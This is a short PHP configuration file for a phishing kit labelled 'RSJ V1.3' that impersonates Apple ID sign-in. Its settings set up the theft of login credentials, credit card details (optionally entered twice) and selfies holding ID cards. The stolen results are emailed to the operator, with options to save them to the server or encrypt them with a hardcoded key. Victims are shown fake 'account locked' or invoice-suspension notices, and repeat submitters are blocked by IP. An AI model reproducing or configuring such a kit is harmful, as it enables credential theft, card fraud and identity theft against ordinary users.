<?php

/*
RSJ V1.3
*/

error_reporting(0);
$randomnumber = rand(1,100);
$t_login = "no"; // no = false no = false for True login apple id  
$param = "_"; // Parameter Redirect
$panel = "PKU";
$user_allow = "false"; // false for apple user only and false for all user agent 
$Your_Email = "pkuspammer@domain.com"; // Set your email
$SenderLogin = "Login Data"; //name sender for Login
$SenderCC = "Result CC"; //name sender for CC
$SenderPhoto = "PAP BULE"; //name sender for idcard
$SenderEmail = "result-$randomnumber@rsj.tech";
$doublecc = "active"; // active for user input cc 2x
$idcard = "noi";  // yoi for user upload selfie with card
$typelogin = "locked"; // locked for notice login account locked , invoice for notice login suspend because invoice payment
$Send_Log = 1;  // Email results
$Save_Log = 0;  // Saves results to server (./assets/logs/) 
$Abuse_Filter = 1; // Block absuive text  
$One_Time_Access = "block"; // One Time access: This nons the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$Encrypt=0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key = 	"125J734M"; // This key is used to decrypt results and can be changed
$Send_Per_Page=1; // Send each pages data seperate
?>